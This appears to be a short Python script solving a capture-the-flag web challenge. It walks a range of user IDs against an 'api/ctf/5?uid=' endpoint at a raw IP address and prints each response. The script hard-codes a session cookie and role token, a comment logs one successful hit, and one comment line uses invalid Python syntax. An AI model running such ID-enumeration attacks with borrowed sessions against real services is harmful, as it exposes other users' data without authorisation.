from configparser import RawConfigParser

import requests
//100336900 {"code":200,"data":"a29fdef7-0be8c448-b02decca-e20200c0","msg":""}
headers = {
    'Cookie': 'role=7b7bc2512ee1fedcd76bdc68926d4f7b;session=eyJ1aWQiOiIzODY0NDAxMDEifQ.X5Wi3w.3rx2iWIXvaLTqt---Oa-vnL8mUY',
	'Host': '45.113.201.36',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36',
	'X-Requested-With': 'XMLHttpRequest',
    'Connection': 'keep-alive',
    # 'Pragma': 'no-cache',
    # 'Cache-Control': 'no-cache',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Upgrade-Insecure-Requests': '1',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7',
}
# self.headers = None

s = requests.Session()
url = 'http://45.113.201.36/api/ctf/5?uid='


if __name__ == "__main__":
    # for i in range(10000):
    for i in range(100336889, 100337000):
        response = s.get(
            url=url + str(i), headers=headers)
        print(i, response.text) 
